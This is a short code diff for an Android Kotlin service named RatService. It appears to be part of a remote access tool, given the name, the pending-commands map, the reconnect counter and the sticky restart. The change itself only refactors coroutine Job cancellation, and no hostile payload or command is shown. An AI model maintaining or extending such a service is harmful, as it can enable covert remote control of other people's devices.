@@ -39,7 +39,8 @@ class RatService : Service() {
     }
 
     private val httpClient = NetworkUtils.createHttpClient()
-    private val scope = CoroutineScope(Dispatchers.IO + Job())
+    private val scopeJob = Job()
+    private val scope = CoroutineScope(Dispatchers.IO + scopeJob)
     private val pendingCommands = ConcurrentHashMap<String, String>()
     private val isConnected = java.util.concurrent.atomic.AtomicBoolean(false)
     private var reconnectAttempts = 0
@@ -62,7 +63,7 @@ class RatService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onDestroy() {
-        scope.cancel()
+        scopeJob.cancel()
         instance = null
         super.onDestroy()
     }
